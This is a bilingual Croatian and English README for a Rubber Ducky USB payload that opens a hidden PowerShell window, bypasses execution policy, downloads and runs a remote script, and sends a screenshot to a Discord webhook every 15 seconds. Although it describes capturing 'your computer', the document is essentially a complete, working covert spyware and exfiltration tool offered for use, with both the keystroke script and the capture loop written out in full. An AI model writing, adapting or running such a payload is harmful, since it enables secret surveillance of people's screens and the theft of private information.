### README.md (na Hrvatskom)

# Screenshot na Discord Webhook

Ova skripta omogućuje automatsko slanje screenshotova s vašeg računala na Discord kanal koristeći webhook. Skripta koristi PowerShell za snimanje zaslona, a Rubber Ducky uređaj za automatsko pokretanje procesa.

## Preduvjeti

1. **Rubber Ducky uređaj** (ili kompatibilni uređaj).
2. **PowerShell** instaliran na računalu (Windows).
3. **Discord webhook URL** za slanje screenshotova.

## Instalacija i Postavljanje

### 1. Priprema PowerShell Skripte

Prvo, trebate imati skriptu koja će automatski preuzeti sliku ekrana i poslati je na vaš Discord kanal. Ovu skriptu možete pohraniti na **GitHub** ili bilo koji drugi poslužitelj.

1. Spremite PowerShell skriptu (`screenshot.ps1`) na GitHub ili neki drugi poslužitelj. Ako koristite GitHub, možete je pohraniti kao **gist**.

2. Zamijenite `DISCORD_WEBHOOK_HERE` u Rubber Ducky skripti sa stvarnim Discord webhook URL-om.

### 2. Rubber Ducky Skripta

Ovdje je skripta koju treba prenijeti na vaš **Rubber Ducky uređaj**. Ova skripta će otvoriti PowerShell, preuzeti PowerShell skriptu s vašeg poslužitelja i izvršiti ju.

**Rubber Ducky Skripta:**

```plaintext
DELAY 1000
GUI r
DELAY 750
STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm linkzaps1fajlgithub | iex
ENTER
```

Zamijenite `linkzaps1fajlgithub` s URL-om na kojem je pohranjena vaša PowerShell skripta.

### 3. PowerShell Skripta (screenshot.ps1)

Ovdje je sadržaj PowerShell skripte koja će preuzeti screenshot i poslati ga na Discord webhook.

```powershell
$hookurl = $dc
$seconds = 15
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
while ($true) {
    $Filett = "$env:temp\SC.png"
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::Png)
    curl.exe -F "file1=@$Filett" $hookurl
    Remove-Item -Path $Filett
    Start-Sleep $seconds
}
```

### 4. Pokretanje

1. Spojite **Rubber Ducky uređaj** na računalo.
2. Skripta će automatski otvoriti PowerShell, preuzeti i pokrenuti PowerShell skriptu koja snima screenshotove.
3. Svakih 15 sekundi, skripta će snimiti sliku ekrana i poslati je na Discord kanal.

## Upute za prilagodbu

* **Interval između screenshotova**: Ako želite promijeniti interval između slanja screenshotova, uredite vrijednost `$seconds` u PowerShell skripti.
* **Webhook URL**: Promijenite `DISCORD_WEBHOOK_HERE` u stvarni URL vašeg Discord webhook-a.

---

### README.md (in English)

# Screenshot to Discord Webhook

This script allows automatic screenshot capturing from your computer and sends them to a Discord channel using a webhook. It uses PowerShell to capture the screen and a Rubber Ducky device to automate the process.

## Prerequisites

1. **Rubber Ducky device** (or a compatible device).
2. **PowerShell** installed on your computer (Windows).
3. **Discord webhook URL** for sending screenshots.

## Installation and Setup

### 1. Preparing the PowerShell Script

First, you need to have a script that will automatically capture the screen and send it to your Discord channel. You can store this script on **GitHub** or any other server.

1. Save the PowerShell script (`screenshot.ps1`) on GitHub or any other server. If you're using GitHub, you can store it as a **gist**.

2. Replace `DISCORD_WEBHOOK_HERE` in the Rubber Ducky script with your actual Discord webhook URL.

### 2. Rubber Ducky Script

Here is the script you need to upload to your **Rubber Ducky device**. This script will open PowerShell, download the PowerShell script from your server, and execute it.

**Rubber Ducky Script:**

```plaintext
DELAY 1000
GUI r
DELAY 750
STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm linkzaps1fajlgithub | iex
ENTER
```

Replace `linkzaps1fajlgithub` with the URL where your PowerShell script is stored.

### 3. PowerShell Script (screenshot.ps1)

Here is the content of the PowerShell script that will capture the screenshot and send it to the Discord webhook.

```powershell
$hookurl = $dc
$seconds = 15
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
while ($true) {
    $Filett = "$env:temp\SC.png"
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::Png)
    curl.exe -F "file1=@$Filett" $hookurl
    Remove-Item -Path $Filett
    Start-Sleep $seconds
}
```

### 4. Running

1. Plug in the **Rubber Ducky device** to the computer.
2. The script will automatically open PowerShell, download, and run the PowerShell script that captures the screenshots.
3. Every 15 seconds, the script will take a screenshot and send it to the Discord channel.

## Customization Instructions

* **Screenshot Interval**: If you want to change the interval between screenshots, modify the `$seconds` value in the PowerShell script.
* **Webhook URL**: Change `DISCORD_WEBHOOK_HERE` to your actual Discord webhook URL.

---

Ovaj README je sada pripremljen za oba jezika i daje jasne upute za korištenje skripte na oba jezika.
